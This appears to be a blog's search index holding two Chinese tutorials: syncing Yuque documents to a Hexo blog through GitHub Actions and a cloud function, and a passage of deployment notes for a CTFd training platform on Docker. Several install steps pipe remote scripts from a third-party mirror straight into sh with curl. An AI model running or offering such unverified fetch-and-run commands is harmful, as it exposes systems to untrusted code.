<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>自动同步语雀文档至Hexo博客</title>
      <link href="/posts/yuque-hexo/"/>
      <url>/posts/yuque-hexo/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文通过 <a href="https://www.yuque.com">语雀</a> 编写，首发于 <a href="https://ollyhsu.github.io/">Olly’s Blog</a> ，转载请注明出处。作者: Oliver</p></blockquote><h2 id="前言">前言</h2><p>「语雀」是一个「专业的云端知识库」，孵化自 <a href="https://www.antgroup.com/">蚂蚁金服</a> ，是 <a href="https://www.yuque.com/yubo/morning/xtech-and-good-life">体验科技</a> 理念下的一款创新产品，已是 10 万阿里员工进行文档编写、知识沉淀的标配。</p><p>语雀诞生伊始，只是希望能给工程师提供一个好用的工具用来写技术文档，达成「用 Markdown 写文档」这个小目标。但在产品研发的过程中，我们发现其实身边的每个人、每个团队、每个组织都有很多知识，但一直以来缺少一个好用的工具让这些知识不只是留在每个人的大脑或电脑里，还可以被记录、分享和交流。</p><p>所以，带着这颗初心，我们觉得语雀不应止步于服务工程师，应该致力于为每个想表达所思所想的人提供一款顺手的工具，让知识能得以记录和传播，让人们可以在「语雀」中平等快乐地创作和交流知识，让再小的个体也可以拥有自己的知识库。</p><h2 id="准备-Hexo-博客">准备 Hexo 博客</h2><p>由于作者自从从 Typecho 阵营转入到 Hexo，一直在使用 Hexo 博客作为个人学习的博客，故食用本教程之前你需要搭建一个 Hexo 博客，具体可以前往我的个人博客搜索安装部署的方法。安装 yuque-hexo 插件后，需要在 package.json 中添加插件配置。官方配置如下：</p><blockquote><p>package.json</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;your hexo project&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;yuqueConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;postPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;source/_posts/yuque&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cachePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yuque.json&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mdNameFormat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;title&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;adapter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hexo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;concurrency&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.yuque.com/api/v2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;login&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blog&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;onlyPublished&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;onlyPublic&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;lastGeneratePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lastGeneratePath.log&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>但是作者配置里没有加上 token，token 记得自己修改一下，因此我们修改配置如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;yuqueConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;postPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;source/_posts/yuque&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;cachePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yuque.json&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;mdNameFormat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;title&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;concurrency&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.yuque.com/api/v2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;login&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oliver&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blog&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*********************&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;onlyPublished&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;onlyPublic&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><h2 id="推送-Hexo-目录">推送 Hexo 目录</h2><p>这里我们需要创建一个 GitHub 私有仓库用来存放 Hexo 源代码，这里可能有人发现主题目录无法推送，我们需要删除主题文件夹下的.git 文件夹，这样才能上传主题文件夹至私有仓库，然后运行<code>git rm -r --cache .</code>和<code>git push -f</code>。这种做法也有一个弊端就是主题不利于更新，所以我这里主题文件夹采用的是子模块的方式。</p><h2 id="GitHub-Action">GitHub Action</h2><p>通过 Action，github 可以循行 hexo 指令，比如将语雀文章同步到 source/_post/yuque，生成静态文件，上传 github pages 等等。</p><p>参考我的个人配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当有改动推送到master分支时，启动Action</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">Hexo自动部署</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>, <span class="string">repository_dispatch</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">检查分支</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">ref:</span> <span class="string">master</span> <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Node</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Hexo</span> <span class="string">及</span> <span class="string">yuque-hexo</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        export TZ=&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"><span class="string">        npm install hexo-cli -g</span></span><br><span class="line"><span class="string">        npm install yuque-hexo -g</span></span><br><span class="line"><span class="string">        yuque-hexo clean</span></span><br><span class="line"><span class="string">        yuque-hexo sync</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">配置Git用户名邮箱</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        git config --global user.name &quot;Oliver&quot;</span></span><br><span class="line"><span class="string">        git config --global user.email &quot;oliverxxx@gmail.com&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">更新</span> <span class="string">语雀拉取缓存及文章</span> <span class="comment">#更新yuque 拉取的文章到GitHub仓库</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        # echo `date +&quot;%Y-%m-%d %H:%M:%S&quot;` begin &gt; time.log</span></span><br><span class="line"><span class="string">        git add .</span></span><br><span class="line"><span class="string">        git commit -m &quot;Refresh yuque `date +&#x27;%Y%m%d%H%M&#x27;`&quot; -a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">推送</span> <span class="string">语雀拉取缓存及文章</span> <span class="comment">#推送修改后的yuque json</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">ad-m/github-push-action@master</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">github_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">缓存</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/cache@v1</span></span><br><span class="line">      <span class="attr">id:</span> <span class="string">cache</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">node_modules</span></span><br><span class="line">        <span class="attr">key:</span> <span class="string">$&#123;&#123;runner.OS&#125;&#125;-$&#123;&#123;hashFiles(&#x27;**/package-lock.json&#x27;)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装依赖</span></span><br><span class="line">      <span class="attr">if:</span> <span class="string">steps.cache.outputs.cache-hit</span> <span class="type">!=</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        npm install --save</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">更新Butterfly主题</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        git submodule init</span></span><br><span class="line"><span class="string">        git submodule update --remote</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">生成静态文件</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        hexo clean</span></span><br><span class="line"><span class="string">        hexo douban -bm</span></span><br><span class="line"><span class="string">        hexo generate</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">部署推送</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">deploy</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="云函数">云函数</h2><p>云函数是为了接收语雀的回调，也就是当我们更新删除新建知识库文章时，语雀就会向一个指定的 url 发起请求，云函数就用来接收这个请求。云函数接收到请求后，调用 github 的 api，运行 action，action 再执行 hexo 指令部署博客。这里是我使用的百度云函数内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="string">import</span> <span class="string">requests</span></span><br><span class="line"></span><br><span class="line"><span class="string">def</span> <span class="string">main_handler(event,</span> <span class="string">context):</span></span><br><span class="line">    <span class="string">r</span> <span class="string">=</span> <span class="string">requests.post(&quot;https://api.github.com/repos/你的github用户名/源码仓库名/dispatches&quot;,</span></span><br><span class="line">    <span class="string">json</span> <span class="string">=</span> &#123;<span class="attr">&quot;event_type&quot;:</span> <span class="string">&quot;start&quot;</span>&#125;<span class="string">,</span></span><br><span class="line">    <span class="string">headers</span> <span class="string">=</span> &#123;<span class="string">&quot;User-Agent&quot;</span><span class="string">:&#x27;curl/7.52.1&#x27;</span>,</span><br><span class="line">              <span class="attr">&#x27;Content-Type&#x27;:</span> <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">              <span class="attr">&#x27;Accept&#x27;:</span> <span class="string">&#x27;application/vnd.github.everest-preview+json&#x27;</span>,</span><br><span class="line">              <span class="attr">&#x27;Authorization&#x27;:</span> <span class="string">&#x27;Token github的Token&#x27;</span>&#125;<span class="string">)</span></span><br><span class="line"></span><br><span class="line">    <span class="string">if</span> <span class="string">r.status_code</span> <span class="string">==</span> <span class="attr">204:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">&quot;This&#x27;s OK!&quot;</span></span><br><span class="line">    <span class="attr">else:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">r.status_code</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hexo-模板">Hexo 模板</h2><p>为了更加方便的使用 Hexo Font-matter 插件的头部格式，我们只需要在语雀编辑器中，标题一下，正文以上的部位，添加如下内容,abbrlink 根据自己需求填写：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">tags: [语雀, 教程, Hexo]</span><br><span class="line">categories: [Course, Hexo]</span><br><span class="line">updated: 2021-09-29 17:00:00</span><br><span class="line">abbrlink: yuque-hexo</span><br><span class="line">description: 本文章通过语雀编写~</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>另存为模板，每次写文章都应用此模板就可以了，每篇文章记得修改 abbrlink 地址。</p>]]></content>
      
      
      <categories>
          
          <category> Course </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Hexo </tag>
            
            <tag> 语雀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd动态靶场环境部署笔记</title>
      <link href="/posts/ctfd/"/>
      <url>/posts/ctfd/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>目前CTFd平台的搭建教程网上有很多，但也有部分写的水，不够详细，跟着那些教程部署完多多少少还是会出现不少问题，从而导致部署失败，既浪费了时间精力不说还多多少少影响了学习的进度，有这个功夫在这多折腾平台，还不如多做两道PWN题目呢~</p><p>由于学校社团内部学习交流的需要，本人在经过两天的折腾学习后，结合各位前辈所写的的教程，终于成功搭建了最新的版本的CTFd，同时使用CTFd-Whale支持动态靶场环境。</p><p>本教程基于 Debian 10 + Docker + Docker Compose部署（CentOS 系统也可以参考，安装完Docker的步骤都是一样的），采用最新的CTFd v3.3.1安装，文章最后更新日期为 <strong>2021.08.04</strong></p><p>如遇到网络环境不佳，导致下载安装速度过慢，请尝试换源、科学上网（自行搜索，禁止在评论区讨论）等。</p><p>博主 <a href="https://github.com/ollyhsu">@Oliver</a> 已经对CTFd v3.3.1官方源码进行了更换国内镜像源、添加CTFd-Whale子模块、配置frp网络、设置静态文件CDN加速等工作，可前往使用作者修改的版本进行安装部署。请前往获取：<a href="https://github.com/ollyhsu/CTFd.git">https://github.com/ollyhsu/CTFd.git</a></p><p>注意：本文已开启版权信息复制，复制相关代码，请在文本编辑器里手动删除，谢谢配合！</p><p>文章图片均已添加水印，转载请注明原出处：<a href="https://ollyhsu.github.io/posts/ctfd/">https://ollyhsu.github.io/posts/ctfd/</a></p><h2 id="环境配置">环境配置</h2><h3 id="系统换源">系统换源</h3><p>由于本人的环境为Debian10，故只针对此系统进行换源。</p><p><strong>阿里源</strong></p><p>直接编辑 <code>/etc/apt/sources.list</code> 文件（需要使用 root 权限）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb http://mirrors.aliyun.com/debian/ buster main contrib non-free</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ buster-updates main contrib non-free</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ buster-proposed-updates main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib</span><br><span class="line"><span class="comment"># deb-src http://mirrors.aliyun.com/debian/ buster-updates main contrib non-free</span></span><br><span class="line"><span class="comment"># deb-src http://mirrors.aliyun.com/debian/ buster main contrib non-free</span></span><br><span class="line"><span class="comment"># deb-src http://mirrors.aliyun.com/debian/ buster-proposed-updates main contrib non-free</span></span><br><span class="line"><span class="comment"># deb-src http://mirrors.aliyun.com/debian/ buster-backports main contrib non-free</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib</span><br><span class="line"><span class="comment"># deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib</span></span><br></pre></td></tr></table></figure><p>更改完 <code>sources.list</code> 文件后请运行 <code>sudo apt-get update</code> 更新索引以生效。</p><p><strong>中科大源</strong></p><p>一般情况下，将 <code>/etc/apt/sources.list</code> 文件中 Debian 默认的源地址 <code>http://deb.debian.org/</code> 替换为 <code>http://mirrors.ustc.edu.cn</code> 即可；对于Debian Security 源，将默认的源地址 <code>http://security.debian.org/debian-security/</code> 替换为 <code>http://mirrors.ustc.edu.cn/debian-security/</code> 即可。</p><p>可以使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.list</span><br><span class="line">sudo sed -i <span class="string">&#x27;s|security.debian.org/debian-security|mirrors.ustc.edu.cn/debian-security|g&#x27;</span> /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>当然也可以直接编辑 <code>/etc/apt/sources.list</code> 文件（需要使用 root 权限）。</p><p>以下是 Debian Stable （当前 Stable 为 Debian 10，代号为 Buster）参考配置内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/debian stable main contrib non-free</span><br><span class="line"><span class="comment"># deb-src http://mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span><br><span class="line"><span class="comment"># deb-src http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class="line"><span class="comment"># deb http://mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span><br><span class="line"><span class="comment"># deb-src http://mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/debian-security/ stable/updates main non-free contrib</span><br><span class="line"><span class="comment"># deb-src http://mirrors.ustc.edu.cn/debian-security/ stable/updates main non-free contrib</span></span><br></pre></td></tr></table></figure><p>更改完 <code>sources.list</code> 文件后请运行 <code>sudo apt-get update</code> 更新索引以生效。</p><p><strong>清华源</strong></p><p>直接编辑 <code>/etc/apt/sources.list</code> 文件（需要使用 root 权限）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free</span></span><br></pre></td></tr></table></figure><p>更改完 <code>sources.list</code> 文件后请运行 <code>sudo apt-get update</code> 更新索引以生效。</p><h3 id="安装Git">安装Git</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git -y</span><br></pre></td></tr></table></figure><h3 id="Docker环境安装">Docker环境安装</h3><p>本教程使用的是DaoCloud安装脚本，如果需要使用手动安装请移步官方教程、国内请参考各镜像站的教程。</p><h4 id="在-Linux上-安装-Docker">在 Linux上 安装 Docker</h4><p>Docker 的 <a href="https://get.docker.com/">安装资源文件 </a>存放在Amazon S3，会间歇性连接失败。所以安装Docker的时候，会比较慢。你可以通过执行下面的命令，高速安装Docker。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure><p>适用于Ubuntu，Debian,Centos等大部分Linux，会3小时同步一次Docker官方资源</p><h4 id="安装-Docker-Compose">安装 Docker Compose</h4><p><a href="https://docs.docker.com/compose/install/">Docker Compose </a>存放在Git Hub，不太稳定。你可以也通过执行下面的命令，高速安装Docker Compose。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.29.2/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>你可以通过修改URL中的版本，可以自定义您的需要的版本</p><h4 id="启动Docker服务并设置为开机启动">启动Docker服务并设置为开机启动</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h4 id="Docker-Hub加速（可选）">Docker Hub加速（可选）</h4><p>为避免<code>docker pull</code>拉取镜像的速度过慢，我们可以选择配置镜像站进行加速。</p><p>请先前往DaoCloud官网获取类似下面的加速脚本，复制官网上的加速脚本。博主使用的加速地址已经使用“xxx”隐藏，请使用最新官方地址，请注意修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxxxxxxx.m.daocloud.io</span><br><span class="line"></span><br><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure><p>该脚本可以将 --registry-mirror 加入到你的 Docker 配置文件 /etc/docker/daemon.json 中。适用于 Ubuntu14.04、Debian、CentOS6 、CentOS7、Fedora、Arch Linux、openSUSE Leap 42.1，其他版本可能有细微不同。</p><p>手动修改：</p><p>修改<code>/etc/docker/daemon.json</code>文件（若不存在则自行创建），加入如下内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;你的加速地址&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>里面更换为想要的镜像地址即可。</p><p>本文采用的是DaoCloud镜像站，整体体验效果及速度都还不错！你也可以选择其他加速服务。</p><ul><li>DaoCloud：<a href="https://www.daocloud.io/mirror">https://www.daocloud.io/mirror</a></li><li>阿里云容器镜像服务（使用自己的阿里云账户申请）：<a href="https://cr.console.aliyun.com/#/accelerator">https://cr.console.aliyun.com/#/accelerator</a></li><li>网易：<a href="https://hub-mirror.c.163.com/">https://hub-mirror.c.163.com/</a></li></ul><p>修改文件后，执行命令重启docker服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h4 id="查看版本信息">查看版本信息</h4><p>通过<code>docker --version</code>来验证Docker安装是否成功</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801161605012.png" alt="image-20210801161605012"></p><p>通过<code>docker-compose --version</code>来验证Docker Compose安装是否成功</p><p><img src="https://cdn.jsdelivr.net/gh/ollyhsu/PicBed@master/2021/08/image-20210801161632646.png" alt="image-20210801161632646"></p><p>如果能正常返回版本信息，那么恭喜你现在已经完成了环境准备环节，加油！</p><h2 id="安装准备">安装准备</h2><blockquote><p>本文针对的是最新版CTFd 3.3.1及CTFd-whale的教程，若不需要配置CTFd-Whale，请移步官方教程。</p></blockquote><h3 id="Docker集群设置">Docker集群设置</h3><p>1、启用Docker Swarm，并为生成的Manager节点取一个别名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker swarm init<span class="comment"># 初始化</span></span><br><span class="line">docker node <span class="built_in">ls</span><span class="comment"># 查看节点ID</span></span><br><span class="line">docker node update --label-add name=linux-1 &lt;节点 ID&gt;  <span class="comment"># 添加别名</span></span><br></pre></td></tr></table></figure><p><img 